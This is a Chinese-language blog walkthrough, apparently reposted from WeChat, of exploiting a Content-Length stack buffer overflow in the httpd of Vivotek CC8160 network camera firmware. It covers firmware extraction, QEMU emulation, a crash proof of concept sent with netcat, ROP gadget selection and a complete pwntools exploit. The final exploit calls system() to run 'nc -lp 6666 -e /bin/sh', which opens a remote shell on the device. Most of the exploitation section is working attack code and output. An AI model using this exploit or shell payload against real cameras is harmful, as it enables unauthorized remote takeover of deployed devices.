<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/cuGsb2D-OGGJXF9IfcBaKg)

### 一、固件提取

http://download.vivotek.com/downloadfile/downloads/firmware/cc8160firmware.zip

```
binwalk -Me CC8160-VVTK-0113b.flash.pkg

```

路径_CC8160-VVTK-0113b.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DuOm8dvcSSzQY4k8f5hmiaUce5VklNzemDZoJfTzAic9U2bz543jLHgbw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DtAueibYDJwciaCBnLlkEgwIPFZ10zHoBqG1QKO5ueh6dbbSnLN7CbO9Q/640?wx_fmt=png&from=appmsg)

确定架构为 ARM、小端、32 位

### 二、官方揭露阅读

conkielength 过长导致的栈溢出 在 ida 搜索一下 Content-Length

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DZtnBq32ktd2gXekyrAwibPxR8eP1VGx3zlUISYEIedrgGAFVUBwZI6g/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DTbhG64hfqUOuAwiciaFv1dXF4Cly6HbOckUQvkf7iafcZQwHnGSGWsxibg/640?wx_fmt=png&from=appmsg)

没有检查 length 的长度，全部赋值到 dest 这个栈上变量

### 三、环境搭建

```
sudo chroot . ./qemu-arm-static ./usr/sbin/httpd


```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DRGke4ub8HoiaficffkFs3Q93vCSNxVe1mPuGCwd5qKSicictzWDmhD1cBA/640?wx_fmt=png&from=appmsg)

分析一下 httpd 文件吧 搜一下字符串

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6Dl7iaiadOaJAhRxia0sLjysTpWwiaQVM80YqJlgLV0ibEErI3zJhTMRF6jWA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DEhUTsQ7oIL0gnPY2M3RibxPr18pWskia9NYh3RLqstAUxRkbNJJKtjzw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DfytBzNYRyDzelLKSvVp4ZUEvHOSPna8LsVribT4FHNia93loTSLcBK5Q/640?wx_fmt=png&from=appmsg)

发现缺少条件，但是测试的我直接给他 patch 掉，就不用去搞这些配置文件了

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DES7DsLHhtNjN9WzGjhhZoJ6hC6v53X0BvGkP30ibre1BmO3DDWmz4icg/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6D0AlkvGVnBwDUrN23peib6n0Czp7IhyYUqFTqmulGXuBjAB8gwYI8eew/640?wx_fmt=png&from=appmsg)

没有文件配置文件也可以跑，但是后面会用到文件中的内容，导致 ddos

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6Do3CFD6miaqQB3Vx60bHqW03W2uJsz1cSibTu1t6v8iaYrv6FQicrxWNH3g/640?wx_fmt=png&from=appmsg)

在文件系统里面搜索该配置文件，在./_31.extracted/defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/conf.d/boa/boa.conf，把该 / etc 目录拷到../mnt/flash / 目录下面，即可修复该问题。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6D18yIIDib2VE8nGIiaPxXUpfu0yFFvbYaX6WXEI2uicOP0O5wyzcRq8bxw/640?wx_fmt=png&from=appmsg)

跑起来了，跟着反馈继续跟进

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DY2ibicNwtGuxXKKWQ9oOK95uuMTahNf33SLaiaV8bv5z8lAok91SWZpMw/640?wx_fmt=png&from=appmsg)

gethostbyname()：用域名或主机名获取 IP 地址。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DysxoFP3vpYo7JANTeTSBcvVNou6qArYHDU4kDxcuLUOrGojZRgicf6Q/640?wx_fmt=png&from=appmsg)

```
cat /proc/sys/kernel/hostname
cat ./etc/hosts
127.0.0.1 Network-Camera localhost
debian-armel


```

需要把他们俩改为一致就可以跑了 笔者的用户名是 ubuntu

```
 echo "192.168.100.2 debian-armel localhost" > squashfs-root/etc/hosts


```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DBO2DY7ia6vmcrXicKxh434EUhFiaDxiabV2NubjC8AXxdPrUrfAsrJRpeA/640?wx_fmt=png&from=appmsg)

qemu 宿主机环境搭建

```
rm -rf vmlinuz-3.2.0-4-versatile
rm -rf initrd.img-3.2.0-4-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-3.2.0-4-versatile
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-3.2.0-4-versatile


```

设置 tap0 网卡 net.sh  笔者的理解是

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DHWFgI5armIpnyia5aY5iab4tn5OCXQdwk5TxYpf49NzD1ZWx1GJKOkKg/640?wx_fmt=png&from=appmsg)

```
sudo ip tuntap add mode tap name tap0
sudo ip link set tap0 up
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE  #这里的网卡ens33要改成自己的噢
sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT
sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0


```

qemu 宿主机启动脚本 start.sh

```
sudo qemu-system-arm \
-M versatilepb \
-kernel vmlinuz-3.2.0-4-versatile \
-initrd initrd.img-3.2.0-4-versatile \
-hda debian_wheezy_armel_standard.qcow2 \
-append "root=/dev/sda1"  \
-net nic -net tap,ifname=tap0,script=no,downscript=no \
-nographic\


```

给 qemu 机器设置网卡 ip

```
ifconfig eth0 192.168.100.2 netmask 255.255.255.0
route add default gw 192.168.100.254


```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6D8650kngMZSKQjibtl3qlfacve3KFyYZChKn4EltIAEbWbk3YtwgzLyw/640?wx_fmt=png&from=appmsg)

将文件传到宿主机

```
sudo scp -r  squashfs-root/  root@192.168.100.2:/root


```

启动服务

```
chmod -R 777 squashfs-root/
chroot ./squashfs-root/ /bin/sh
./usr/sbin/httpd


```

启动之后我宿主机连不上去，很奇怪

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DzmJG8ZrABsFPliaicibTmareLAIsUiaOucctZhNVGaWkUpo6K5Mlb4rDnQ/640?wx_fmt=jpeg&from=appmsg)

发现是 httpd 文件被笔者 patch 错了 还需要对机器进行挂载和赋权操作

```
mount -t proc /proc ./squashfs-root/proc
mount -o bind /dev ./squashfs-root/dev
chmod -R 777 squashfs-root/
chroot ./squashfs-root/ /bin/sh
./usr/sbin/httpd


```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DQN9hjUE3AiaaVBB1Uc7yfU8iaeccHj7QvPCAjdptowxJjD3gTRp5Ep1Q/640?wx_fmt=png&from=appmsg)

### 四、验证 poc  
  
  
  
  
  
  

```
echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | netcat -v 192.168.100.2 80


```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DVVfyBgZ7ruczib7HzOIPPHMHicXRd1Ag4NvicSFf2yoOfensCibvjuVHlg/640?wx_fmt=png&from=appmsg)

进行调试发现

```
./gdbserver.armel --attach 192.168.100.254:1234  2440


```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DtXmbgPIjicxvJ3FLZzRc7qTO1LquFAoFa0CnukDk1G6Mib1UHZnuL9iaw/640?wx_fmt=png&from=appmsg)

溢出量为 0x33，开了 nx 保护 得到基地址

```
cat /proc/2386/maps


```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DXNpnfWaC658HOft1ZZoJdqCgvKTgSThvmUTbqloJj4Axc6bCoKqHiaw/640?wx_fmt=png&from=appmsg)

### 五、漏洞利用

rop 链构造

```
lyyy@ubuntu:~/Desktop/vr/squashfs-root$ ROPgadget --binary ./lib/libc.so.0 --only "pop|ret"
Gadgets information
============================================================
0x00046428 : pop {fp, pc}
0x00033100 : pop {r0, pc}
0x00048784 : pop {r1, pc}
0x0000b490 : pop {r3, pc}
0x0000d71c : pop {r3, r4, r5, pc}
0x0000a46c : pop {r3, r4, r5, r6, r7, pc}
0x0000cf14 : pop {r3, r4, r5, r6, r7, r8, sb, pc}
0x0002cf58 : pop {r3, r4, r5, r6, r7, r8, sb, pc} ; pop {r3, r4, r5, r6, r7, r8, sb, pc}
0x000174c8 : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}
0x0000b7c0 : pop {r3, r4, r7, pc}
0x0000ae00 : pop {r4, pc}
0x0000ddf0 : pop {r4, pc} ; pop {r4, pc}
0x0000abb8 : pop {r4, r5, pc}
0x0000a83c : pop {r4, r5, r6, pc}
0x0000aa64 : pop {r4, r5, r6, r7, pc}
0x0000b364 : pop {r4, r5, r6, r7, r8, pc}
0x0000a700 : pop {r4, r5, r6, r7, r8, sb, pc}
0x0000db64 : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}
0x0000d110 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
0x0000a97c : pop {r4, r5, r7, pc}
0x00042540 : pop {r4, r6, r7, pc}
0x0000b6e0 : pop {r4, r7, pc}
0x0000d320 : pop {r4, r7, pc} ; pop {r4, r7, pc}
0x0000a4ac : pop {r7, pc}

Unique gadgets found: 24

```

```
pop {r1，pc};==pop r1;ret 
mov r0,r1;


```

tips1 ：为什么不用，

```
0x00033100   pop  r0   gadeget地址带有/x00，漏洞使用strncmp，所以会有/x00截断


```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DULfHj7ajmNbgnVymjEIpNsIicaD1M9KSAbPxC5Kn2FtqZtASBDGJoDw/640?wx_fmt=png&from=appmsg)

完整 poc

```
from pwn import*
import requests
p=remote('192.168.100.2',80)

libc=ELF('./lib/libc.so.0')
context.log_level='debug'
libc_base=0xb6f2d000
pop_r1=0x00048784+libc_base
mov_r0_r1=0x00016aa4+libc_base
system=libc_base+libc.sym['system']
stack = 0xbeffeb64#反弹shell语句的地方
amd='aaaaaa'
head = b"POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:"
payload = b'b'*(0x00003c-8)+p32(pop_r1)+p32(stack)+p32(mov_r0_r1)+b'b'*8+p32(system)
end = b'nc  -lp 6666 -e /bin/sh;'+b'\r\n\r\n'

p.sendline(head+payload+end)


```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTKLAj3woQxBiaIzdNZUTW6DzLOWiaLicKIdjsMBsNZP6DlQf3xsujPK3E6LLpG70YF0iakBh6GSeJXdg/640?wx_fmt=png&from=appmsg)

把 shell 反弹到 6666 端口，nc 上就是一个 shell 了